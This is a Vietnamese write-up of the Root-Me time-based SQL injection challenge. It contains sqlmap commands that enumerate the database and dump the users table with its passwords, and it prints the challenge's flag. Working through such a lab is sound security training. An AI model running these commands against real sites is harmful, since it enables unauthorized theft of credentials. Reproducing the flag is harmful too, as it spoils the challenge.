---
template: overrides/blog.html
icon: material/plus-circle
title: SQL injection - Time based
description: >
  
search:
  exclude: true
hide:
  - feedback

tags:
    - SQL Injection 
---

# __SQL injection - Time based__

<span>
:octicons-calendar-24: May 03, 2023

</span>

---


## __Tài nguyên và link challenge__

Tài nguyên của challenge này tại [https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based)

Link challenge này tại [:octicons-arrow-right-24: http://challenge01.root-me.org/web-serveur/ch40/][http://challenge01.root-me.org/web-serveur/ch40/]

  [http://challenge01.root-me.org/web-serveur/ch40/]: http://challenge01.root-me.org/web-serveur/ch40/

## __Tổng quan__

Trong challenge này, mục tiêu của ta là lấy được password admin.

> __Time-based SQL Injection__ là một kỹ thuật SQL Injection suy luận dựa trên việc gửi một truy vấn SQL đến cơ sở dữ liệu, buộc cơ sở dữ liệu phải đợi một khoảng thời gian xác định (tính bằng giây) trước khi phản hồi

## __Kịch bản tấn công__
### Bước 1: Kiểm tra website

Challenge này cung cấp cho ta 2 website: 1 cho việc login tài khoản, 1 cho việc xem danh sách tài khoản

Có thể thấy, sau một vài thao tác truy cập danh sách tài khoản thì đều yêu cầu login tài khoản mới được quyền xem

### Bước 2: Khai thác website

Đầu tiên, ta dùng sqlmap để quét website và đặt thời gian cho CSDL phản hồi là 10s bằng lệnh `sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=10 --dbs`

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-time-based-01.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả câu lệnh</figcaption>
</figure>

???+ question "Chậm lại và suy nghĩ 1"

    Nếu không dùng `--time-sec=10`, liệu còn cách nào có thể quét ra database public không?

??? success "Giải quyết chậm lại suy nghĩ"

    Tôi đã nhúng 1 hình ảnh thể hiện cách giải nhằm đâu đó trong website này, bạn đọc tìm thử nhé. Cách tìm giống như bài nào đó phía trên :smile_cat: :smile_cat: :smile_cat:
Roài, ta tìm table trong database public thôi nào !!!!!

Dùng lệnh `sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=10 -D public --tables`

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-time-based-02.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả câu lệnh</figcaption>
</figure>

Từ đây, ta thấy được table users, tiến hành lấy các cột ở table và cuối cùng dump dữ liệu, ta sẽ được flag

<div class="result" markdown>

``` shell linenums="1"
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=10 -D public -T users --columns
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=10 -D public -T users -C id,email,usermame,password --dump
```

</div>

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-time-based-03.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả câu lệnh</figcaption>
</figure>

!!! success "__Flag__"
    T!m3B@s3DSQL!
